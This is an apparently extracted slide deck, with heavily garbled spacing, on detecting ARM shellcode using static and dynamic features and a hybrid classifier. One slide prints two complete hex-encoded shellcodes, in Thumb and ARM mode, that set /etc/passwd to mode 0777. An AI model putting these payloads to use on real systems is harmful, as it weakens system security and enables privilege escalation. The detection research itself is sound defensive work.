Shellcodes   
for  ARM:  
Your  Pills  Don’t 
Work  on  Me,  x86 
Svetlana Gaivoronski  @SadieSv 
Ivan Petrov                  @_IvanPetrov_ 
Why  it’s  important !
! !Increasing!number!of!ARM3based!devices!
! !Signiﬁcant!number!of!vulnerable!so:ware!
!!!!!!!and!huge!base!of!reusable!code!
! !Memory!corrup?on!errors!are!s?ll!there! 
@SadieSv!!!!!!!@_IvanPetrov_!
Is  it  decidable? 
Ac?vator!
• NOP!
• GetPC!
Decryptor!
Payload!
Return!address!zone!
! !Structure!limita?ons!!
! !Size!limita?ons!
@SadieSv!!!!!!!@_IvanPetrov_!
May  be  it’s  not  that  bad? 
! !Stack!canaries:!calculates!pseudo!
!!!!BL!prin]!
!!!!B!.!L8!
.!L4!:!
!!!!LDR!r0!,!!
!!!!BL!prin]!
.!L8!:!
CMP!r1!,!#0!
LDRNE!r0!,!!
LDREQ!r0!,!!
BL!prin]!
Without!condi?onal!
instruc?ons!
With!condi?onal!
instruc?ons!
Condi?onal!execu?on!
@SadieSv!!!!!!!@_IvanPetrov_!
Thumb!!CPU  mode!
!
chmod("/etc/passwd",!0777)!3!31!byte!
!!
"\x78\x46"!!!!!!!!!!!!!!!!!!!//!mov!!r0,!pc
!!
"\x10\x30"!!!!!!!!!!!!!!!!!!!//!adds!r0,!#16
!!
"\xﬀ\x21"!!!!!!!!!!!!!!!!!!!!!//!movs!r1,!#255!!!!;!0xﬀ!!
"\xﬀ\x31"!!!!!!!!!!!!!!!!!!!!!//!adds!r1,!#255!!!!;!0xﬀ !!
"\x01\x31"!!!!!!!!!!!!!!!!!!!//!adds!r1,!#1
!!
"\x0f\x37"!!!!!!!!!!!!!!!!!!!!//!adds!r7,!#15
!!
"\x01\xdf"!!!!!!!!!!!!!!!!!!!!//!svc!!1
!;!chmod(..)!
"\x40\x40"!!!!!!!!!!!!!!!!!!!//!eors!r0,!r0!!
"\x01\x27"!!!!!!!!!!!!!!!!!!!//!movs!r7,!#1
!!
"\x01\xdf"!!!!!!!!!!!!!!!!!!!!//!svc!!1
!;!exit(0)!
"\x2f\x65\x74\x63"!!!! !!
"\x2f\x70\x61\x73"!!!! !!
"\x73\x77"!!!!!!!!!!!!!!!!!!! !!
"\x64”!
!
chmod("/etc/passwd",!0777)!3!51!byte!
!
"\x0f\x00\xa0\xe1"!
!!//!mov
!r0,!pc!
"\x20\x00\x90\xe2"! !!//!adds
!r0,!r0,!#32!
"\xﬀ\x10\xb0\xe3"!
!!//!movs
!r1,!#255
!;!0xﬀ!
"\xﬀ\x10\x91\xe2"!
!!//!adds
!r1,!r1,!#255!;!0xﬀ!
"\x01\x10\x91\xe2"! !!//!adds
!r1,!r1,!#1!
"\x0f\x70\x97\xe2"!
!!//!adds
!r7,!r7,!#15!
"\x01\x00\x00\xef"!
!!//!svc
!1!
"\x00\x00\x30\xe0"! !!//!eors
!r0,!r0,!r0!
"\x01\x70\xb0\xe3"! !!//!movs
!r7,!#1!
"\x01\x00\x00\xef"!
!!//!svc
!1!
"\x2f\x65\x74\x63"!!!!!!!!
!!
"\x2f\x70\x61\x73"!!!!!!!!
!!
"\x73\x77"!!!!!!!!!!!!!!!!!!!!!!!
!!
"\x64"!
!
Thumb!mode!
ARM!mode!
@SadieSv!!!!!!!@_IvanPetrov_!
Local  recap 
Sta?c!analysis!
Dynamic!analysis!!
@SadieSv!!!!!!!@_IvanPetrov_!
What  cause  such  problems 
(mostly) 
New!obfusca?on!techniques:!
1.!!!CondiDonal!execuDon;!
2.!!!AddiDonal!CPU!mode.!
@SadieSv!!!!!!!@_IvanPetrov_!
The  next  step? 
! We!already!have!(sDll!on<going)!work!on!x86!
!!!!!shellcodes!detecDon:!
!–!Set!of!features!!
!
! Are!they!features!of!ARM<based!shellcodes!!
!!!!!too?!
!
! Can!we!idenDfy!something!new?!
Static  features 
• Correct&disassembly&for&chain&of&at&least&K&instruc;ons; 
• Command&of&CPU&mode&switching&(BX&Rm); 
• Exis;ng&of&Get3UsePC&code; 
• Number&of&speciﬁc&paJerns&(&arguments&ini;aliza;ons,&func;on&calls&)&exceeds&
some&threshold; 
• Arguments&inializa;on&strictly&before&system&calls&; 
• Write&to&memory&and&load&from&memory&cycles; 
• Return&address&in&some&range&of&values; 
• Last&instruc;on&in&the&chain&is&(BL,&BLX),&or&system&call&(svc); 
• Operands!of!self3iden?ﬁed!code!and!code!with!indirect!jumps!must!to!be!
ini?alized. 
Correct  disassembly  for  a  chain  of  at  least  K 
instructions!
Non!a!shellcode!
Shellcode!!
@SadieSv!!!!!!!@_IvanPetrov_!
Non!a!shellcode!
Non!a!shellcode!
Non!a!shellcode!
Command  of  CPU  mode  switching  (!BX !Rm )!
CPU!mode!switch!
Shellcode!in!Thumb!
mode!
Arguments!for!system!call!
PC!register!
Jump!with!exchange!
Thumb!mode!number!
@SadieSv!!!!!!!@_IvanPetrov_!
Existing  of!!Get3UsePC  code!
PC!register!
Encrypted!shellcode!
Get!PC!
Use!PC!
Get!PC!into!LR!register!(r14)!
Use!PC!
@SadieSv!!!!!!!@_IvanPetrov_!
Arguments  initializations  for  system calls  
and  library  calls!
Arguments!
System!call!number!
System!call!
_socket!!#281!
_connect!!!#283!
@SadieSv!!!!!!!@_IvanPetrov_!
Write  to  memory  and  load   
from  memory  cycles!
Encrypted!shellcode!
Read!from!memory!
Store!to!memory!
Cycle!counter!
Address!of!encrypted!
payload!
Main!cycle!
@SadieSv!!!!!!!@_IvanPetrov_!
Return  address  in  some  range  of  values!
Return!
address!
Vulnerable!
buﬀer!
Stack!
Payload!
Shellcode!
0xbeﬀedbc&
0xbeﬀedbc&
0xbeﬀedbc&
0xbeﬀedbc&
0xbeﬀedbc&
0xbeﬀedbc&
Return!address!
zone!
@SadieSv!!!!!!!@_IvanPetrov_!
Dynamic  features 
•  The&number&of&payload&reads&exceeds&threshold; 
•  The&number&of&unique&writes&into&memory&exceeds&
threshold; 
•  Control&ﬂow&is&redirected&to&“just&wriJen”&address&
loca;on&at&least&once; 
•  Number&of&executed&wx3instruc;ons&exceeds&threshold; 
•  Condi;onal3based&signatures.& 
@SadieSv!!!!!!!@_IvanPetrov_!
Read  and  write  to  memory!
Decryptor!
Encrypted!payload!
N!Unique!reads!and!writes!
@SadieSv!!!!!!!@_IvanPetrov_!
Control  flow  switch!
Decryptor!
Decrypted!payload!
Control!ﬂow!
@SadieSv!!!!!!!@_IvanPetrov_!
Conditional - based  signatures!
Z!=!0!&!C!=!0!
Z!=!1!&!C!=!0!
!
ADDEQS!r0,!r1!
ADDEQS!r0,!r1!
AL!block!!
(every!ﬂag)!
AL!block!!
(every!ﬂag)!
CS!block!
(!С!==!1)!
Z!=!0!
С!=!1!
CS!block!
(!С!==!1)!
NE!block!
(!Z!==!0)!
NE!block!
(!Z!==!0)!
ADDCCS!r3,!r4!
ADDCCS!r3,!r4!
Z!=!1!
С!=!0!
!
If!EQ!block!was!
executed,!then!!
Z!=!1,!else!Z!=!0!
NE!block!
(!Z!==!0)!
NE!block!
(!Z!==!0)!
@SadieSv!!!!!!!@_IvanPetrov_!
Hybrid  classifier 
@SadieSv!!!!!!!@_IvanPetrov_!
What’s  next 
Make! another! module! to!
shellcode! detec?on! tool! 3!!
Demorpheus&
@SadieSv!!!!!!!@_IvanPetrov_!
Experiments 
• Shellcodes; 
• Legi?mate!binaries; 
• Random!data; 
• Mul?media. 
@SadieSv!!!!!!!@_IvanPetrov_!
Experiments!
@SadieSv!!!!!!!@_IvanPetrov_!
Datasets!
FN!
FP!
Shellcodes!
0!
n/a!
LegiDmate!binaries!
n/a!
1.1!
MulDmedia!!
n/a!
0.33!
Random!data!!
n/a!
0.27!
@SadieSv!!!!!!!@_IvanPetrov_!
Dataset!
Throughput!
Shellcodes!
56.5!Mb/s!
LegiDmate!binaries!
64.8!Mb/s!
MulDmedia!
93.8!Mb/s!
Random!data!
99.5!Mb/s!
2!GHZ!Intel!Core!i7!
Experiments!
Your   questions? 
@SadieSv!!!!!!!@_IvanPetrov_!